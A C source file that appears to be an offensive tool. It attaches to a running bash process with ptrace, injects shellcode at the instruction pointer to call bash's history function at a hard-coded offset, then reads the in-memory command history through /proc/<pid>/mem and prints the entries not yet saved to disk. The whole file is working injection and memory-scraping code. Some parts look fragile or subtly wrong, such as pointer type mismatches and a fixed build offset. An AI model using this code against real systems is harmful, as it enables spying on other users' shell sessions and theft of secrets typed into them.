#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>


typedef char *histdata_t;
typedef struct _hist_entry {
  char *line;
  char *timestamp;		/* char * rather than time_t for read/write */
  histdata_t data;
} HIST_ENTRY;

typedef struct _hist_state {
  HIST_ENTRY **entries;		/* Pointer to the entries themselves. */
  int offset;			/* The location pointer within this array. */
  int length;			/* Number of elements within this array. */
  int size;			/* Number of slots allocated to this array. */
  int flags;
} HISTORY_STATE;

// Shellcode template - will be patched with actual address
unsigned char shellcode[] = {
    0x48, 0x83, 0xec, 0x08,           // sub rsp, 8 (align stack)
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, FUNCTION_ADDR
    0xff, 0xd0,                        // call rax
    0x48, 0x83, 0xc4, 0x08,           // add rsp, 8
    0xcc                               // int3
};

unsigned long get_base_address(pid_t pid) {
    char maps_file[64];
    char line[256];
    unsigned long base_addr = 0;
    
    snprintf(maps_file, sizeof(maps_file), "/proc/%d/maps", pid);
    FILE *fp = fopen(maps_file, "r");
    if (!fp) {
        perror("Failed to open maps file");
        exit(1);
    }
    
    if (fgets(line, sizeof(line), fp)) {
        sscanf(line, "%lx-", &base_addr);
    }
    
    fclose(fp);
    return base_addr;
}
int count_lines_in_file(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) return -1;

    int lines = 0;
    char ch;
    while ((ch = fgetc(file)) != EOF)
        if (ch == '\n') lines++;

    fclose(file);
    return lines;
}


size_t get_history_diff(pid_t pid, unsigned long address, int history_file_rows) {
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    int mem_fd = open(mem_path, O_RDONLY);
    if (mem_fd == -1) {
        perror("Error opening /proc/<pid>/mem");
        return 0;
    }

    HIST_ENTRY *entry_ptr = NULL;
    size_t size = 0;
    unsigned long *ptr_2_ptr = NULL, *ptr_line = NULL;
    char line[256];

    // Loop to read history entries from the remote process memory
    while (1) {
        // Read the pointer to the next HIST_ENTRY
        if (pread(mem_fd, &entry_ptr, sizeof(entry_ptr), address + size * sizeof(entry_ptr)) != sizeof(entry_ptr)) {
            perror("Error reading HIST_ENTRY pointer");
            close(mem_fd);
            return 0; // Return 0 if reading fails
        }

        // If we have passed the history file rows, start processing entries
        if (size > history_file_rows) {
            // Read the pointer to the 'line' string
            if (pread(mem_fd, &ptr_2_ptr, sizeof(unsigned long), address + (size - 1) * sizeof(entry_ptr)) != sizeof(unsigned long)) {
                perror("Error reading pointer to 'line'");
                close(mem_fd);
                return 0;
            }

            // Read the actual 'line' pointer
            if (pread(mem_fd, &ptr_line, sizeof(unsigned long), ptr_2_ptr) != sizeof(unsigned long)) {
                perror("Error reading 'line' pointer");
                close(mem_fd);
                return 0;
            }

            // Read the 'line' string from memory
            if (pread(mem_fd, line, sizeof(line), ptr_line) < 0) {
                perror("Error reading 'line' string");
                close(mem_fd);
                return 0;
            }

            // Print the retrieved 'line'
            printf("line: %s\n", line);

            // If NULL entry is found, stop processing
            if (entry_ptr == NULL) break;
        }

        size++;
    }

    close(mem_fd); 
    return size;   
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <bash_pid>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long base_addr = get_base_address(target_pid);
    unsigned long history_func_addr = base_addr + 0xfa8a0;
    
    printf("Base address: %lx\n", base_addr);
    printf("History function address: %lx\n", history_func_addr);
    
    // Patch shellcode with actual function address
    memcpy(shellcode + 6, &history_func_addr, sizeof(history_func_addr));
    
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("Failed to attach");
        return 1;
    }
    
    int status;
    waitpid(target_pid, &status, 0);
    
    // Get original registers
    struct user_regs_struct orig_regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &orig_regs) == -1) {
        perror("Failed to get registers");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    
    // Save original code
    unsigned long orig_code[sizeof(shellcode) / sizeof(unsigned long) + 1];
    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(unsigned long)) {
        orig_code[i / sizeof(unsigned long)] = ptrace(PTRACE_PEEKTEXT, target_pid, 
            orig_regs.rip + i, NULL);
    }
    
    // Write shellcode
    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(unsigned long)) {
        unsigned long data = 0;

        // Calculate the number of bytes to copy
        size_t bytes_to_copy;
        if (sizeof(shellcode) - i < sizeof(unsigned long)) {
            bytes_to_copy = sizeof(shellcode) - i;
        } else {
            bytes_to_copy = sizeof(unsigned long);
        }

        // Copy the shellcode into data
        memcpy(&data, shellcode + i, bytes_to_copy);

        // Write the data to the target process memory
        if (ptrace(PTRACE_POKETEXT, target_pid, orig_regs.rip + i, data) == -1) {
            perror("Failed to write shellcode");
            goto cleanup;
        }
    }
    
    // Continue execution
    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) == -1) {
        perror("Failed to continue execution");
        goto cleanup;
    }
    
    // Wait for int3
    waitpid(target_pid, &status, 0);
    
    if (!WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP) {
        printf("Process did not stop as expected\n");
        goto cleanup;
    }
    
    // Get registers to read return value
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("Failed to get registers after shellcode");
        goto cleanup;
    }
    
    
    HIST_ENTRY *the_history ;
    if (regs.rax != 0) {
    the_history = (HIST_ENTRY**)regs.rax;
    printf("Return value (HIST_ENTRY**): %p\n", the_history);
    int history_file_rows = count_lines_in_file("/home/user/.bash_history");
    printf("Printing commands from history:\n");
    get_history_diff(target_pid,the_history,history_file_rows);    

    
    }


cleanup:
    // Restore original code
    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(unsigned long)) {
        ptrace(PTRACE_POKETEXT, target_pid, orig_regs.rip + i, 
            orig_code[i / sizeof(unsigned long)]);
    }
    
    // Restore original registers
    ptrace(PTRACE_SETREGS, target_pid, NULL, &orig_regs);

    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    return 0;
}